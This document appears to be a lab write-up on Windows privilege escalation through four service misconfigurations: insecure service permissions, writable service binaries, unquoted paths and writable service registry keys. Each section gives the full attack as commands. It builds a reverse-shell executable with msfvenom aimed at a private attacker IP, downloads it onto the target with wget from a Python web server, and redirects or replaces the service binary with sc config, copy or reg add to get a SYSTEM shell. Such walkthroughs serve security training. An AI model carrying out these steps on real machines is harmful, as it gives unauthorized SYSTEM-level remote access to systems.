**Misconfigured Services**

**1. Insecure Service Permission**

Service is a process in Windows which runs on background without any user interaction.

***sc query*** >> command to list all the services

<img width="828" height="334" alt="image" src="https://github.com/user-attachments/assets/9200e629-21fb-4ed1-9d13-81afc05a16d8" />

Now, there are many services which are default and running by Windows. We need to find those services which are running any .exe file and could be vulnerable :-

On the PowerShell

***Get-CimInstance Win32_Service*** >> It will show all the running services

<img width="786" height="510" alt="image" src="https://github.com/user-attachments/assets/3eb0a9db-6c91-4910-b357-f8b454519f17" />

We need to filter more,

***Get-CimInstance Win32_Service | Where-Object PathName -notMatch “windows” | Select Name, Pathname***

It will show all the 3rd party services and their path

<img width="786" height="188" alt="image" src="https://github.com/user-attachments/assets/68ee98ae-25aa-4e0a-829f-b9d244116687" />

Now we need to identify which service is vulnerable.

The is a service daclsvc which is running an .exe

We can modify the exe file and put a revers shell there. Or we can put a revers shell and give its path to daclsvc.

On the local machine we will create a payload and move it to the target machine

***msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.130.110.75 LPORT=4444 -f exe -o shell.exe***

<img width="786" height="148" alt="image" src="https://github.com/user-attachments/assets/ba396edb-3fc0-4095-995d-f1bdcc186e69" />

Our payload is created. Now we need to move this payload to the target machine.

<img width="786" height="156" alt="image" src="https://github.com/user-attachments/assets/5cf6f1ab-19c0-4439-bd59-f82082202f22" />

Lets start a python server on local machine.

On the target machine,

***wget http://10.130.110.75:9999/shell.exe -OutFile shell.exe***

Wget will only on PowerShell and not on CMD

<img width="786" height="341" alt="image" src="https://github.com/user-attachments/assets/a7b8f296-b7bc-4d60-9b87-1bb9375b042d" />

File has been transferred.

Now lets see configuration on the target service daclsvc

<img width="786" height="238" alt="image" src="https://github.com/user-attachments/assets/cf57336e-cecc-4217-a2fe-7f8af4f2c323" />

START_TYPE is DEMAND_START which means we need to start this service manually. It will not automatically get started

Now, we need to change the BINARY_PATH_NAME to reverse shell payload location. Lets check if we have permission or not

SERVICE_START_NAME : LocalSystem >> It means it run with NT Authority privileges.

***sc config daclsvc binpath=”C:\Users\user\shell.exe***

<img width="786" height="109" alt="image" src="https://github.com/user-attachments/assets/acd53573-5671-4aca-afb9-fe39576c54b7" />

Path changed to our payload. Lets verity

<img width="786" height="269" alt="image" src="https://github.com/user-attachments/assets/ef859e68-0dba-4334-96a9-5f9a4f70e0aa" />

Lets start a netcat listener to the local machine

<img width="667" height="198" alt="image" src="https://github.com/user-attachments/assets/5a955095-bc08-4040-afd2-351ba6d66853" />

Lets start the service

***sc start daclsvc*** >> To start the servcie

<img width="665" height="61" alt="image" src="https://github.com/user-attachments/assets/7e8d14fe-f8c7-4783-9c84-dd3e574a2fd1" />

And we got the shell

<img width="786" height="282" alt="image" src="https://github.com/user-attachments/assets/eb930277-ff37-4226-bc77-cc348ed73cfe" />

**2. Insecure Service Executable**

Now, lets check our next target

These are the services running on the target machine. We will target filepermsvc

***Get-CimInstance Win32_Service | Where-Object PathName -notMatch “windows” | Select Name, Pathname***

<img width="786" height="240" alt="image" src="https://github.com/user-attachments/assets/70df6a4e-3cb9-49f9-b2f3-3d8f87593dad" />

Lets check its configuration

<img width="786" height="258" alt="image" src="https://github.com/user-attachments/assets/1b495c51-fb9c-4f8d-a740-352b1b3a0746" />

Now, lets say we don't have permissions to check the BINARY_PATH this time. In that case, we can try to put our payload in this location with the same name.

Lets create a payload in our local machine

***msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.130.110.108 LPORT=4444 -f exe -o shell.exe***

<img width="828" height="229" alt="image" src="https://github.com/user-attachments/assets/927d45d0-6dd8-4d64-bf98-b62122a258a7" />

Lets start a python server

***python -m http.server 9999***

<img width="786" height="134" alt="image" src="https://github.com/user-attachments/assets/d3978bda-cb89-4b9a-8a5a-942b617f6a4d" />

On target machine, lets transfer this file

***wget http://10.130.110.75:9999/shell.exe -OutFile shell.exe***

<img width="783" height="471" alt="image" src="https://github.com/user-attachments/assets/a6e7ce83-3dba-4dbe-b676-ff939f22fe35" />

File has been transferred to target machine.

Now we will copy this payload to the location of the service filepermsvc

***copy shell.exe “C:\Program Files\File Permissions Service\filepermservice.exe” /y***

<img width="786" height="90" alt="image" src="https://github.com/user-attachments/assets/df1f2908-daa4-49a0-8881-a98f85129a37" />

File has been copied. Now lets start a netcat listener in out local machine

<img width="726" height="103" alt="image" src="https://github.com/user-attachments/assets/f86a79da-977b-462d-807c-2f26fc555c66" />

Let start the service filepermsvc

<img width="700" height="71" alt="image" src="https://github.com/user-attachments/assets/478bcbf0-4926-4d0a-bf61-491c6c8ff71b" />

And we got the shell

<img width="786" height="360" alt="image" src="https://github.com/user-attachments/assets/998d7289-240d-41fe-a33d-37b814e305a3" />

**3. Unquoted Service Path**

Lets check the services again

***Get-CimInstance Win32_Service | Where-Object PathName -notMatch “windows” | Select Name, Pathname***

<img width="786" height="229" alt="image" src="https://github.com/user-attachments/assets/802b3e29-f3e3-4b96-81da-1c14408b5075" />

There are two services which binary path does not contain quotes (“”)

Lets understand how windows work.

***C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe***

While reading path, windows stop at space and check if any .exe file exists or not.

C:\Program >> Windows will check if any Program.exe file exists in C:\

If not, it will stop at next space.

C:\Program Files\Unquoted >> It will again check if any Unquoted.exe file exists in C:\Program Files\.

If not, it will stop at next space till it reaches unquotedpathservice.exe and execute it.

Now, if we can create a file Program.exe in C:\ and put our payload in it, Windows will execute it when the Service start.

In general, we will not have any permission to create any file in C:\

TIP: - Always start checking from backwards

Lets create a payload Common.exe inside C:\Program Files\Unquoted Path Service\

On our local machine, lets create a payload

***msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.130.73.108 LPORT=4444 -f exe -o Common.exe***

<img width="786" height="220" alt="image" src="https://github.com/user-attachments/assets/9d8218d7-2cbc-47ad-ac4d-3b5a60395907" />

Lets move this payload to the target machine

<img width="786" height="120" alt="image" src="https://github.com/user-attachments/assets/6d1cde92-a669-450a-9b04-baa8f447145c" />

On target machine

***wget http://10.130.73.108:9999/Common.exe -OutFile Common.exe***

<img width="786" height="431" alt="image" src="https://github.com/user-attachments/assets/8373304a-02c1-4626-9ae8-6100a63670ab" />

Now lets copy this file to C:\Program Files\Unquoted Path Service\

<img width="786" height="462" alt="image" src="https://github.com/user-attachments/assets/da90ee57-7fbe-4a27-af8e-81acd1f94d8d" />

Lets start a net cat listener

<img width="636" height="161" alt="image" src="https://github.com/user-attachments/assets/47e9a0b2-b79c-4e5f-9a30-ea32798c1926" />

Now, let start the Service unquotedsvc

<img width="630" height="80" alt="image" src="https://github.com/user-attachments/assets/3c880a37-6cfe-4a14-8142-ec87b6bfc18e" />

And we got the shell

<img width="828" height="321" alt="image" src="https://github.com/user-attachments/assets/8f315944-7d4a-42eb-bd41-2204c36a554a" />

**4. Insecure Service Registry**

All Windows configuration and settings are stored in Registry. sc command read the details from Registry and show to us.

We can also modify directly in Regisrty as well.

***Get-CimInstance Win32_Service | Where-Object PathName -notMatch “windows” | Select Name, Pathname***

<img width="786" height="204" alt="image" src="https://github.com/user-attachments/assets/343bb6e8-c17e-468b-8d63-d34b231f7d3d" />

Now, if we want more information about registry regsev we can query register as well. It will give similar output as sc qu regsev

***reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc***

<img width="786" height="362" alt="image" src="https://github.com/user-attachments/assets/fd921346-824a-4a93-86ea-d6ee9c9f3fc7" />

Now, we can directly modify the ImagePath in the registry itself. Let’s put our payload, shell.exe in the Binary Path of the Registry.

We have a payload in C:\Users\user folder

<img width="655" height="403" alt="image" src="https://github.com/user-attachments/assets/b795965b-94e0-43c0-bf73-1dc1d9c994eb" />

We will add this path to the Register

***reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\shell.exe /f***

<img width="786" height="242" alt="image" src="https://github.com/user-attachments/assets/8b4ea076-3098-4859-b1d0-dcc4915ead89" />

Path has been changed to the payload.

Lets start a netcat listener

<img width="721" height="142" alt="image" src="https://github.com/user-attachments/assets/b0b0fba6-cbe8-4281-b350-861827ac6004" />

Lets start the service regsvc

<img width="786" height="95" alt="image" src="https://github.com/user-attachments/assets/dd251095-1932-480d-8271-47ca33277600" />

And we got the shell

<img width="732" height="297" alt="image" src="https://github.com/user-attachments/assets/eb1eaf96-ed2b-41e2-8d09-fe163ce2220e" />
